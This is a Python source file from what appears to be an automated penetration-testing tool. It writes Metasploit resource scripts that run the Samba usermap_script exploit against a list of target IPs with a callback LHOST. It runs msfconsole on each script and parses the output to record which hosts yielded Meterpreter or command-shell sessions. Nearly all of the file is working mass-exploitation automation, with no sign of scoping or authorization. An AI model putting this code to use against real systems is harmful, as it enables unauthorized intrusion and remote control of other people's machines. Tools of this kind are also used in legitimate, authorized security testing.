import subprocess
import os
import time
import re
import threading
from modules.core.utils import safe_filename
import os

def clean_rc_dir(rc_dir):
    for f in os.listdir(rc_dir):
        if f.endswith(".rc"):
            os.remove(os.path.join(rc_dir, f))

exploit_modules = [
    ("samba", """
use exploit/multi/samba/usermap_script
set RHOSTS {target}
set LHOST {lhost}
set ExitOnSession true
run
exit
"""),
    # Add more exploits as needed
]



def generate_per_exploit_rcs(target_ips, lhost, output_dir="msf_scripts"):
    import os
    os.makedirs(output_dir, exist_ok=True)
    for target in target_ips:
        for name, tmpl in exploit_modules:
            rc_content = tmpl.format(target=target, lhost=lhost)
            rc_path = os.path.join(output_dir, f"{safe_filename(target)}_{name}.rc")
            with open(rc_path, "w") as f:
                f.write(rc_content)
            print(f"Generated: {rc_path}")


class MetasploitManager:
    def __init__(self, msf_path, rc_files, output_dir, timeout=80, logger=None):
        self.msf_path = msf_path
        self.rc_files = rc_files  # list of full paths to rc files
        self.output_dir = output_dir
        self.timeout = timeout
        self.logger = logger
        self.running = False

    def run_job(self, rc_file):
        out_file = os.path.join(self.output_dir, os.path.basename(rc_file) + ".txt")
        cmd = [self.msf_path, "-r", rc_file, "-q"]
        try:
            with open(out_file, "w") as out:
                subprocess.run(cmd, stdout=out, stderr=subprocess.STDOUT, timeout=180)
        except subprocess.TimeoutExpired:
            if self.logger:
                self.logger.error(f"[MetasploitManager] Timeout on {rc_file}")
        return out_file

    def run_all(self):
        self.running = True
        outputs = []
        for rc_file in self.rc_files:
            if not self.running:
                break
            self.logger.info(f"[MetasploitManager] Running {rc_file}")
            out_file = self.run_job(rc_file)
            outputs.append(out_file)
        self.running = False
        return outputs

    def stop(self):
        self.running = False

    @staticmethod
    def parse_sessions_from_output(output_path):
        """Parses msfconsole output file for session creation."""
        sessions = []
        try:
            with open(output_path, "r") as f:
                for line in f:
                    match = re.search(
                        r'(Meterpreter|Command shell) session (\d+) opened \(([\d\.]+):(\d+) -> ([\d\.]+):(\d+)\)',
                        line
                    )
                    if match:
                        session_type, session_id, lhost, lport, rhost, rport = match.groups()
                        sessions.append({
                            "id": int(session_id),
                            "type": session_type,
                            "lhost": lhost,
                            "lport": lport,
                            "rhost": rhost,
                            "rport": rport,
                        })

                    elif "session" in line and "opened" in line:
                        print("[DEBUG] Unmatched session line:", line)
        except Exception as e:
            print(f"[MetasploitManager] Error parsing output {output_path}: {e}")
        return sessions


    

    def monitor_sessions(self, poll_interval=5, stop_on_session=True):
        """
        Scan all Metasploit output files for created sessions.

        If called from a thread (live monitoring), it will watch for new sessions as files are updated.
        If called after all exploits have run (typical batch mode), it will do a one-time scan.
        Returns: session_map = { rhost: [session_id, ...], ... }
        """
        import time

        session_map = {}

        # --- BATCH MODE: called after exploits finish (self.running == False) ---
        if not getattr(self, "running", False):
            for out_file in os.listdir(self.output_dir):
                if not out_file.endswith(".txt"):
                    continue
                out_path = os.path.join(self.output_dir, out_file)
                sessions = self.parse_sessions_from_output(out_path)
                for sess in sessions:
                    if sess["rhost"] not in session_map:
                        session_map[sess["rhost"]] = []
                    if sess["id"] not in session_map[sess["rhost"]]:
                        session_map[sess["rhost"]].append(sess["id"])
            print("[DEBUG] Final sessions_map (batch):", session_map)
            print("[DEBUG] session_map keys (batch):", list(session_map.keys()))
            return session_map

        # --- LIVE MONITORING MODE (rarely used now) ---
        found_targets = set()
        while self.running:
            for out_file in os.listdir(self.output_dir):
                if not out_file.endswith(".txt"):
                    continue
                out_path = os.path.join(self.output_dir, out_file)
                sessions = self.parse_sessions_from_output(out_path)
                for sess in sessions:
                    if sess["rhost"] not in session_map:
                        session_map[sess["rhost"]] = []
                    if sess["id"] not in session_map[sess["rhost"]]:
                        session_map[sess["rhost"]].append(sess["id"])
                        print(f"[MetasploitManager] New session: {sess}")
                        if self.logger:
                            self.logger.info(f"[MetasploitManager] New session for {sess['rhost']}: {sess['id']}")
                        found_targets.add(sess["rhost"])
                        if stop_on_session:
                            self.stop()
            if stop_on_session and found_targets:
                break
            time.sleep(poll_interval)
        print("[DEBUG] Final sessions_map (monitor):", session_map)
        print("[DEBUG] session_map keys (monitor):", list(session_map.keys()))
        return session_map


